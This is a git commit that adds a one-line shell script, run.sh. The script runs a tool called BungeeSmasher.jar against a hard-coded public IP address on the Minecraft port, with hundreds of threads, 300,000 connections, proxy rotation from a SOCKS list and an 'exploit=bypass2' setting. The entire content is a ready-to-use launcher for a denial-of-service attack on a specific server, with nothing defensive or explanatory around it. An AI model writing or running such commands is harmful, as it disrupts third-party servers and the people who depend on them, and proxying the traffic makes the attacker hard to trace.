20d439ec9e4e90ba6c63c814ba31c9d7331c6781
STRARKTECHNOLOGIES <70024979+STRARKTECHNOLOGIES@users.noreply.github.com>
2021-11-30 15:40:05 +0530

    Initial commit

---
+++ run.sh
@@ -0,0 +1,1 @@
+java -jar BungeeSmasher.jar host=46.101.167.215 port=25565 srvResolve2=false keepAlive=true attackTime=100 proxiesType=socks alwaysResolve=false threads=500 timeout=3000 print=true multi=false proxiesFile=socks4.txt removeFailure=false exploit=bypass2 connections=300000 loopAmount=300
